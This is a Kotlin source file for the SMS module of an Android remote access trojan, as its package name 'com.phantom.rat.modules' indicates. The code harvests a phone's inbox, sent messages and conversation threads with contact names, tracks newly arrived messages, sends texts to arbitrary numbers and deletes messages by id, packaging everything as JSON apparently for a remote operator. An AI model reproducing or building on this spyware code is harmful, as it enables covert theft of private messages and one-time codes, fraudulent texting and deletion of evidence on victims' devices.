package com.phantom.rat.modules

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsModule(private val context: Context) {

    companion object {
        private const val SMS_URI_INBOX = "content://sms/inbox"
        private const val SMS_URI_SENT = "content://sms/sent"
        private const val SMS_URI_ALL = "content://sms"
    }

    fun getAllSms(): JSONObject {
        val result = JSONObject()
        
        try {
            if (!checkSmsPermission()) {
                result.put("status", "error")
                result.put("message", "SMS permission not granted")
                return result
            }
            
            val allSms = JSONArray()
            val inbox = getSmsFromUri(SMS_URI_INBOX, "inbox")
            val sent = getSmsFromUri(SMS_URI_SENT, "sent")
            
            inbox?.let { arr ->
                for (i in 0 until arr.length()) {
                    allSms.put(arr.get(i))
                }
            }
            sent?.let { arr ->
                for (i in 0 until arr.length()) {
                    allSms.put(arr.get(i))
                }
            }
            
            result.put("status", "success")
            result.put("count", allSms.length())
            result.put("messages", allSms)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun getNewSms(): JSONObject {
        val result = JSONObject()
        
        try {
            if (!checkSmsPermission()) {
                result.put("status", "error")
                result.put("message", "Permission not granted")
                return result
            }
            
            val prefs = context.getSharedPreferences("sms_tracker", Context.MODE_PRIVATE)
            val lastCheck = prefs.getLong("last_check", 0)
            
            val cursor = context.contentResolver.query(
                Uri.parse(SMS_URI_ALL),
                null,
                "${Telephony.Sms.DATE} > ?",
                arrayOf(lastCheck.toString()),
                "${Telephony.Sms.DATE} DESC"
            )
            
            val newMessages = JSONArray()
            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                
                while (it.moveToNext()) {
                    val sms = JSONObject().apply {
                        put("id", if (idIndex >= 0) it.getLong(idIndex) else 0)
                        put("address", if (addressIndex >= 0) it.getString(addressIndex) ?: "" else "")
                        put("body", if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else "")
                        put("date", if (dateIndex >= 0) it.getLong(dateIndex) else 0)
                        put("date_formatted", if (dateIndex >= 0)
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(Date(it.getLong(dateIndex))) else "")
                        put("type", if (typeIndex >= 0) 
                            if (it.getInt(typeIndex) == Telephony.Sms.MESSAGE_TYPE_INBOX) "inbox" else "sent" else "")
                        put("read", if (readIndex >= 0) it.getInt(readIndex) == 1 else false)
                        put("contact_name", if (personIndex >= 0) 
                            getContactName(it.getString(addressIndex)) else "")
                    }
                    newMessages.put(sms)
                    
                    if (dateIndex >= 0) {
                        prefs.edit().putLong("last_check", it.getLong(dateIndex)).apply()
                    }
                }
            }
            
            result.put("status", "success")
            result.put("count", newMessages.length())
            result.put("messages", newMessages)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun getOldSms(): JSONObject {
        val result = JSONObject()
        
        try {
            if (!checkSmsPermission()) {
                result.put("status", "error")
                result.put("message", "Permission not granted")
                return result
            }
            
            val prefs = context.getSharedPreferences("sms_tracker", Context.MODE_PRIVATE)
            val lastCheck = prefs.getLong("last_check", System.currentTimeMillis())
            
            val cursor = context.contentResolver.query(
                Uri.parse(SMS_URI_ALL),
                null,
                "${Telephony.Sms.DATE} < ? AND ${Telephony.Sms.DATE} > 0",
                arrayOf(lastCheck.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 500"
            )
            
            val oldMessages = JSONArray()
            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                
                while (it.moveToNext()) {
                    val sms = JSONObject().apply {
                        put("id", if (idIndex >= 0) it.getLong(idIndex) else 0)
                        put("address", if (addressIndex >= 0) it.getString(addressIndex) ?: "" else "")
                        put("body", if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else "")
                        put("date", if (dateIndex >= 0) it.getLong(dateIndex) else 0)
                        put("date_formatted", if (dateIndex >= 0)
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(Date(it.getLong(dateIndex))) else "")
                        put("type", if (typeIndex >= 0)
                            when (it.getInt(typeIndex)) {
                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                                Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                                Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                                Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                                Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                                Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                                else -> "unknown"
                            } else "unknown")
                        put("read", if (readIndex >= 0) it.getInt(readIndex) == 1 else false)
                        put("contact_name", if (idIndex >= 0)
                            getContactName(it.getString(addressIndex)) else "")
                    }
                    oldMessages.put(sms)
                }
            }
            
            result.put("status", "success")
            result.put("count", oldMessages.length())
            result.put("messages", oldMessages)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun sendSms(number: String, message: String): JSONObject {
        val result = JSONObject()
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Send SMS permission not granted")
                    return result
                }
            }
            
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                context.getSystemService(android.telephony.TelephonyManager::class.java)
                    ?.createForSubscriptionId(
                        android.telephony.SubscriptionManager.getDefaultSmsSubscriptionId()
                    )
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            
            if (smsManager is android.telephony.SmsManager) {
                smsManager.sendTextMessage(number, null, message, null, null)
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault().sendTextMessage(number, null, message, null, null)
            }
            
            // Store sent message
            val values = android.content.ContentValues().apply {
                put(Telephony.Sms.ADDRESS, number)
                put(Telephony.Sms.BODY, message)
                put(Telephony.Sms.DATE, System.currentTimeMillis())
                put(Telephony.Sms.TYPE, Telephony.Sms.MESSAGE_TYPE_SENT)
                put(Telephony.Sms.READ, 1)
                put(Telephony.Sms.STATUS, Telephony.Sms.STATUS_COMPLETE)
            }
            
            try {
                context.contentResolver.insert(Telephony.Sms.Sent.CONTENT_URI, values)
            } catch (_: Exception) {}
            
            result.put("status", "success")
            result.put("message", "SMS sent to $number")
            result.put("number", number)
            result.put("text", message)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to send SMS")
        }
        
        return result
    }

    fun deleteSms(id: Long): JSONObject {
        val result = JSONObject()
        
        try {
            val uri = Uri.parse("$SMS_URI_ALL/$id")
            val deleted = context.contentResolver.delete(uri, null, null)
            
            result.put("status", "success")
            result.put("deleted", deleted > 0)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun getInboxCount(): JSONObject {
        val result = JSONObject()
        
        try {
            val cursor = context.contentResolver.query(
                Uri.parse(SMS_URI_INBOX),
                arrayOf("COUNT(*) as count"),
                null, null, null
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    result.put("count", it.getInt(0))
                }
            }
            
            result.put("status", "success")
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    fun getConversations(): JSONObject {
        val result = JSONObject()
        
        try {
            val conversations = JSONArray()
            val uri = Uri.parse("content://mms-sms/conversations?simple=true")
            
            val cursor = context.contentResolver.query(
                uri,
                arrayOf("thread_id", "recipient_ids", "message_count", "date", "snippet"),
                null, null, "date DESC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val conv = JSONObject().apply {
                        put("thread_id", it.getLong(0))
                        put("recipients", it.getString(1))
                        put("count", it.getInt(2))
                        put("date", it.getLong(3))
                        put("snippet", it.getString(4))
                    }
                    conversations.put(conv)
                }
            }
            
            result.put("status", "success")
            result.put("conversations", conversations)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message)
        }
        
        return result
    }

    private fun getSmsFromUri(uriString: String, type: String): JSONArray? {
        try {
            val messages = JSONArray()
            val cursor = context.contentResolver.query(
                Uri.parse(uriString),
                null, null, null,
                "${Telephony.Sms.DATE} DESC LIMIT 500"
            )
            
            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                
                while (it.moveToNext()) {
                    val sms = JSONObject().apply {
                        put("id", if (idIndex >= 0) it.getLong(idIndex) else 0)
                        put("address", if (addressIndex >= 0) it.getString(addressIndex) ?: "" else "")
                        put("body", if (bodyIndex >= 0) it.getString(bodyIndex) ?: "" else "")
                        put("date", if (dateIndex >= 0) it.getLong(dateIndex) else 0)
                        put("date_formatted", if (dateIndex >= 0)
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(Date(it.getLong(dateIndex))) else "")
                        put("type", type)
                        put("read", if (readIndex >= 0) it.getInt(readIndex) == 1 else false)
                        put("contact_name", getContactName(
                            if (addressIndex >= 0) it.getString(addressIndex) ?: "" else ""))
                    }
                    messages.put(sms)
                }
            }
            
            return messages
        } catch (_: Exception) {
            return null
        }
    }

    private fun getContactName(phoneNumber: String?): String {
        if (phoneNumber.isNullOrEmpty()) return ""
        
        try {
            val uri = Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber)
            )
            val cursor = context.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(0) ?: ""
                }
            }
        } catch (_: Exception) {}
        
        return ""
    }

    private fun checkSmsPermission(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED
        }
        return true
    }
}
